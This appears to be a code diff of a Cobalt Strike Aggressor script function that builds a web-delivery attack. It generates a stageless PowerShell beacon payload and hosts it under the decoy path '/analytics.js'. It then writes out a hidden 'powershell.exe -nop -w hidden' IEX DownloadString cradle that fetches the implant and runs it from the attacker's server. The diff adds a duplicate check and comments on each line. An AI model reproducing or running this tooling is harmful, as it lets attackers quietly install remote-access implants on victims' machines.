@@ -1,31 +1,29 @@
-# This is not working yet. Need to get it working to actually create a web delivery payload.
-
 sub createDownloadString {
-    local ('$listener $host $url');
+    local ('$listener $script $host $url'); # Local variables for this function
     
-    $listener = $1;
-    println($listener);
-    
-    $host = listener_info($listener)['host'];
-    println($host);
+    # Check if DownloadString already exists
+    if (-istrue getDownloadString()){
+        println("DownloadString already exists!");
+        return;
+    }
+    # If it does not, create it
+    else {
+        $listener = $1; # Listener to run on
 
-    # Deprecated Method. Replacing with artifact_payload    
-    # artifact_stageless($listener, "powershell", "x64", $null, $this);
-    # yield;
+        $host = listener_info($listener)['host']; # Get host of listener
 
-    $script = artifact_payload($listener, "powershell", "x64");
-    # println($script);
-    
-    site_host($host, 443, "/analytics.js", $script, "text/plain", "Scripted Web Delivery(powershell)");
-    $url = site_host($host, 443, "/analytics.js", $script, "text/plain", "Scripted Web Delivery(powershell)");
-    $url = strrep($url, "http", "https");
-    
-    # Debug Logging
-    println($url);
+        artifact_stageless($listener, "powershell", "x86", $null, $this); # Create stageless powershell artifact
+        yield;
 
-    $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('";
-    $downloadString .= $url . "'))\"";
-    
-    # println("Returning DownloadString $downloadString");
-    say("Here's your DownloadString: \c9$downloadString\o");
+        $script = $1; # Get script variable
+
+        $url = site_host($host, "443", "/analytics.js", $script, "text/plain", "Scripted Web Delivery(powershell)"); # Create URL for downloadstring
+        $url = strrep($url, "http", "https"); # Replace http with https
+
+        $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('"; # Create DownloadString cradle
+        $downloadString .= $url . "'))\""; # End DownloadString cradle
+
+        # println("Returning DownloadString $downloadString");
+        say("Here's your DownloadString: \c9$downloadString\o"); # Print DownloadString
+    }
 }
